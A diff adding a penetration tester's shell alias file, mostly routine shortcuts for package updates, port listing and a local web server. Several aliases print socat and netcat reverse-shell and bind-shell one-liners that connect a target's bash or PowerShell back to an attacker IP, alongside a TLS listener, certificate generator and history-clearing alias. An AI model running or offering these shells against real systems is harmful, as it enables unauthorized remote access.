@@ -1,0 +1,20 @@
+alias history="history 0"
+alias ping="ping -c 4"
+alias static-binaries="echo 'windows: https://github.com/3ndG4me/socat/releases Linux: https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64'"
+alias socat-l="sudo socat -d -d OPENSSL-LISTEN:1337 FILE:`tty`,raw,echo=0,cert=/home/main/Desktop/cert/file.pem,verify=0"
+alias socat-linux='echo "socat -d -d OPENSSL:<attacker-ip>:<attacker-port> EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane,verify=0"'
+alias socat-windows='echo "socat -d -d OPENSSL:<attacker-ip>:<attacker-port> EXEC:powershell.exe,pipes,pty,stderr,sigint,setsid,sane,verify=0"'
+alias socat-generate-ssl="cd /home/main/Desktop/cert; sudo openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.com/O=RedTeam/C=UK' -nodes -keyout shell.key -out shell.crt;sudo cat shell.key shell.crt > file.pem;sleep 10;sudo rm shell.key shell.crt"
+
+alias nc-revshell="echo 'execute this on the target: mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f'"
+alias nc-bindshell="echo 'execute this on the target: mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f'"
+alias update="sudo apt-get update"
+alias upgrade="sudo apt-get upgrade"
+alias downloads="cd /home/pentester/Downloads"
+alias install="sudo apt-get install"
+alias listening="sudo netstat -tulpn | grep LISTEN"
+alias checkopenport="sudo lsof -i:$PORTNUMBER"
+alias server="python3 -m http.server 1337"
+alias listservices="systemctl list-units --type=service"
+alias psrunning="ps -aux | grep $VARIABLE"
+alias myip="ip addr show eth0 | grep inet | awk '{ print $2; }' | sed 's/\/.*$//'"
